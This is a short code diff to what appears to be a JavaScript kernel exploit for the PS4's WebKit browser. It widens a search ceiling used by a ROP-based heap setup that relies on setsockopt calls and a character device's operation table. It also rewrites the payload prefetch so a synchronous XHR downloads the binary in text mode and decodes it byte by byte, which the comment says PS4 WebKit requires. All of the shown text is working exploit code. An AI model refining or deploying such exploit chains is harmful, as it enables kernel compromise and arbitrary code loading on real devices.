@@ -83,7 +83,7 @@ const TUNE = {
   spare: 8,
   units: 15,
   batch: 60,     /* setsockopt per rop entry */
-  ceiling: 63,   /* how far up to look for a free unit */
+  ceiling: 127,  /* how far up to look for a free unit */
 };
 
 /* any cdev will do: the exploit only needs a file whose operation table sits
@@ -2068,11 +2068,17 @@ async function attempt(ctx, opts) {
       try {
         var xhr = new XMLHttpRequest();
         xhr.open("GET", pfWant + (pfWant.indexOf("?") < 0 ? "?" : "&") + "_=" + Date.now(), false);
-        xhr.responseType = "arraybuffer";
+        /* PS4 WebKit does not support responseType="arraybuffer" on synchronous
+           XHR -- it throws "The object does not support the operation or argument".
+           Use binary string mode instead and decode with charCodeAt. */
+        xhr.overrideMimeType("text/plain; charset=x-user-defined");
         xhr.timeout = 4000;
         xhr.send();
-        if (xhr.status >= 200 && xhr.status < 300 && xhr.response)
-          prefetchedPayload = new Uint8Array(xhr.response);
+        if (xhr.status >= 200 && xhr.status < 300 && xhr.responseText) {
+          const s = xhr.responseText;
+          prefetchedPayload = new Uint8Array(s.length);
+          for (let i = 0; i < s.length; i++) prefetchedPayload[i] = s.charCodeAt(i) & 0xff;
+        }
       } catch (e) {
         say("[pre] XHR failed: " + (e && e.message));
       }
